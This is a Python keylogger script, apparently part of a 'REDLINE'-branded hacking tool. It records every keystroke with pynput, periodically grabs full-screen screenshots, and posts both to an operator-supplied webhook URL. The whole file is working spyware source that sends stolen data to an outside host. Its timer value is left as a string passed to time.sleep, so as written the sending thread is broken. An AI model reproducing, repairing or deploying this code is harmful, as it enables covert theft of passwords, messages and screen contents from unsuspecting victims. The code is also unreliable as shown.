from pynput.keyboard import Key, Listener
from colorama import Fore
from PIL import ImageGrab
from io import BytesIO
import requests
import threading
import time

def webhook_log():
    webhook_url = input(f"""{Fore.WHITE}
╔═══[root@{Fore.LIGHTRED_EX}WEBHOOK_URL{Fore.RESET}]~$
╚══> {Fore.RESET}""")

    log_time = input(f"""{Fore.WHITE}
╔═══[root@{Fore.LIGHTRED_EX}LOG_TIME{Fore.RESET}]~$
╚══> {Fore.RESET}""")

    print(f"[{Fore.LIGHTGREEN_EX}INFO{Fore.RESET}] {Fore.WHITE}Start{Fore.RESET} {Fore.LIGHTRED_EX}>{Fore.RESET} {webhook_url}")
    print(f"[{Fore.LIGHTGREEN_EX}INFO{Fore.RESET}] {Fore.WHITE}Sending keylogger in [{log_time}] seconde...{Fore.RESET} {Fore.LIGHTRED_EX}>{Fore.RESET} {webhook_url}")

    key_logs = []

    def send_to_webhook(message, screenshot=None):
        data = {"content": message}
        files = {"file": ("REDLINE.png", screenshot, "image/png")} if screenshot else None
        requests.post(webhook_url, data=data, files=files)

    def capture_screenshot():
        try:
            screenshot = ImageGrab.grab()
            buffer = BytesIO()
            screenshot.save(buffer, format="PNG")
            buffer.seek(0)
            return buffer
        except Exception as e:
            print(f"[{Fore.LIGHTGREEN_EX}INFO{Fore.RESET}] {Fore.RED}ERROR SCREENSHOT >{Fore.RESET}{e}")
            return None

    def webhook_sender():
        while True:
            time.sleep(log_time)
            if key_logs:
                screenshot_data = capture_screenshot()
                send_to_webhook("".join(key_logs), screenshot_data)
                key_logs.clear()

    def on_press(key):
        key_logs.append(str(key).replace("'", "") + " ")

    threading.Thread(target=webhook_sender, daemon=True).start()

    with Listener(on_press=on_press) as listener:
        listener.join()





